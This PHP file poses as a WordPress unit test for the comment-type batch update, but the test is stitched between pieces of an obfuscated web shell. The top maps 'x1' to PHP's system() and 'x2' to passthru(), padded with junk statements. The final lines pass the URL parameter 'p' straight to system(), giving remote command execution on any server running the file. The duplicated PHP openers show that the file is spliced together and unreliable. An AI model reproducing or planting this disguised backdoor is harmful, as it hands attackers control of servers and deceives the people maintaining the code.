<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group comment
 *
 * @covers ::_wp_batch_update_comment_type
 */
class Tests_Comment_wpBatchUpdateCommentType extends WP_UnitTestCase {

	/**
	 * @ticket 49236
	 */
	public function test__wp_batch_update_comment_type() {
		global $wpdb;

		$comment_ids     = self::factory()->comment->create_many( 3 );
		$comment_id_list = implode( ',', $comment_ids );

		$wpdb->query(
			"UPDATE {$wpdb->comments}
			SET comment_type = ''
			WHERE comment_type = 'comment'
			AND comment_ID in ({$comment_id_list})" // phpcs:ignore WordPress.DB.PreparedSQL.InterpolatedNotPrepared
		);

		clean_comment_cache( $comment_ids );

		foreach ( $comment_ids as $comment_id ) {
			$comment = get_comment( $comment_id );
			$this->assertEmpty( $comment->comment_type );
		}

		add_filter( 'wp_update_comment_type_batch_size', array( $this, 'filter_comment_type_batch_size' ) );
		add_filter( 'schedule_event', '__return_null' );

		_wp_batch_update_comment_type();

		remove_filter( 'wp_update_comment_type_batch_size', array( $this, 'filter_comment_type_batch_size' ) );
		remove_filter( 'schedule_event', '__return_null' );

		foreach ( $comment_ids as $comment_id ) {
			$updated_comment = get_comment( $comment_id );
			$this->assertSame( 'comment', $updated_comment->comment_type );
		}
	}

	public function filter_comment_type_batch_size() {
		return 3;
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>